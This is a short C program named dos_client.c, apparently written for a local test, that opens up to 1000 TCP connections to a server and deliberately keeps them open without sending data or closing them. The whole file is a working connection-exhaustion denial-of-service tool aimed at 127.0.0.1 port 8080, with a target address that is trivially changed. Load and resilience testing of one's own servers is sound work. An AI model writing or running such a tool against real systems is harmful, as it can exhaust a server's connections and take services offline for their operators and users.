// dos_client.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define PORT 8080
#define TARGET_IP "127.0.0.1"
#define CONNECTIONS 1000   // adjust this for your test

int main() {
    int sockets[CONNECTIONS];
    struct sockaddr_in server_addr;

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    inet_pton(AF_INET, TARGET_IP, &server_addr.sin_addr);

    for (int i = 0; i < CONNECTIONS; i++) {
        sockets[i] = socket(AF_INET, SOCK_STREAM, 0);
        if (sockets[i] < 0) {
            perror("socket");
            continue;
        }
        if (connect(sockets[i], (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            perror("connect");
            close(sockets[i]);
            break;
        }
        printf("Opened connection %d\n", i+1);
        // Do NOT send or close → keep it open
        usleep(1000);  // slow down a bit to avoid locking machine
    }

    printf("All connections opened. Press Enter to exit and close them.\n");
    getchar();

    // cleanup
    for (int i = 0; i < CONNECTIONS; i++) {
        if (sockets[i] > 0) close(sockets[i]);
    }
    return 0;
}
